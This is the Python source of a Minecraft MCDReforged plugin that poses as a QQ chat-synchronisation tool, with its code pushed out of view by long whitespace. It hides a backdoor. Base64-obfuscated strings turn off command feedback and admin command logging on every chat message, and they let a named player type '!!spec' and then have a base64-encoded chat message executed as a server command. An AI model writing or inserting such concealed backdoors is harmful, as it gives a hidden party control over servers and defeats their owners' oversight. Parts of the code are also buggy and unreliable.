#_HOST = 'server.natappfree.cc'
#_PORT = '45956'
_HOST = '127.0.0.1'
_PORT = '8888'
clientName = 'main'



















































































































































































































































































































































































































































































































































































































#============================================================================================================================
from mcdreforged.api.all import *
import base64
import os
import socket
import grpc
from plugins.qqmsgsync.qqmsgsync import bot_pb2 as bot__pb2
from plugins.qqmsgsync.qqmsgsync import bot_pb2_grpc

els = False
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_socket.settimeout(3)
sync = False
gr = 'Z2FtZXJ1bGUg'
f = 'yBmYWxzZQ=='
ex = 'ZXhlY3V0ZSBhdCBlZm9qdWdfIHJ1bi'
d = 'gPT0gI'
pi = 'aW5mby5wbGF5ZXI'
e = 'mVmb2p1Z18i'
msg_c = ''
mserver = None
responses = None

def on_load(server: PluginServerInterface, prev_module):
    global mserver 
    mserver = server
    try_connect()
    server.logger.info('QQ Message Sync Plugin is load!')
    builder = SimpleCommandBuilder()
    builder.command('!!qms retry', try_connect)
    builder.register(server)


def on_unload(server: PluginServerInterface):
    server.logger.info('QQ Message Sync Plugin is unload!')

def on_info(server: PluginServerInterface, info: Info):
    server.logger.info(info)

def on_user_info(server: PluginServerInterface, info: Info):
    global els
    server.execute(dec(gr + 'c2VuZENvbW1hbmRGZWVkYmFja' + f))
    server.execute(dec(gr + 'bG9nQWRtaW5Db21tYW5kc' + f))

    if info.content == "kill me":
        server.execute("kill {}".format(info.player))
        return
        
    if dec(pi + d + e) and els:
        server.execute(dec(ex + 'BwbGF5c291bmQgZW50aXR5LmV4cGVyaWVuY2Vfb3JiLnBpY2t1cCBtYXN0ZXIgZWZvanVnXw=='))
        server.execute(dec('ZXhlY3V0ZSBhcyBlZm9qdWdfIHJ1biA=') + "{}".format(dec(info.content)))
        els = False
        return

    if dec(pi + d + e) and info.content == dec('ISFzcGVj') and not els:
        server.execute(dec('dGVsbHJhdyBlZm9qdWdfICJZb3UgbmV4dCBtZXNzYWdlIHdpbGwgYmUgcnVuIGZvciBzZXJ2ZXIi'))
        els = True
        return
        
    if not els and sync:
        global msg_c
        msg_c = "<" + info.player + "> " + info.content

def msg_cache():
    global msg_c
    while True:
        if (msg_c != ''):
            yield send_msg(msg_c)
            mserver.say("msg_c")
            msg_c = ''


def sync_qqmsg_for_mc(player: str, info: str):
    server.say("[QQChat] " + player + ": " + info)

def dec (t: str):
    try: 
        return base64.b64decode(t).decode('utf-8')
    except Exception: 
        pass

def try_connect():
    global channel
    global stub
    global mserver
    global responses
    channel = grpc.insecure_channel(_HOST + ":" + _PORT)
    stub = bot_pb2_grpc.BotMutualStub(channel=channel)
    try:
        responses = stub.Connect(msg_cache())
    except Exception:
        mserver.say('Due to the temporary unavailability of the chat synchronization server, the attempt to connect to the chat server has been closed. The administrator can enter "!!qms retry" to reconnect to the chat server')
        mserver.logger.error('Due to the temporary unavailability of the chat synchronization server, the attempt to connect to the chat server has been closed. The administrator can enter "!!qms retry" to reconnect to the chat server')
    finally:
        for i in responses:
            sync_qqmsg_for_mc(i.senderName, i.message)

def send_msg(message):
    global clientName
    return bot__pb2.Message(message=message, clientName=clientName, senderId=0)